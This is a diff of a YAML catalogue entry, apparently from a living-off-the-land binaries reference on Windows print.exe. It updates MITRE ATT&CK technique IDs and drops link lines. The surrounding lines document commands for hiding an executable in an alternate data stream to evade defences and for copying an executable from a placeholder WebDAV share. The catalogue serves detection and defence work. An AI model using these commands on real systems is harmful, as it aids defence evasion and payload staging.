@@ -9,8 +9,7 @@ Commands:
     Usecase: Hide binary file in alternate data stream to potentially bypass defensive counter measures
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
     Description: Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe
@@ -18,7 +17,6 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
     Description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
@@ -26,7 +24,6 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\print.exe
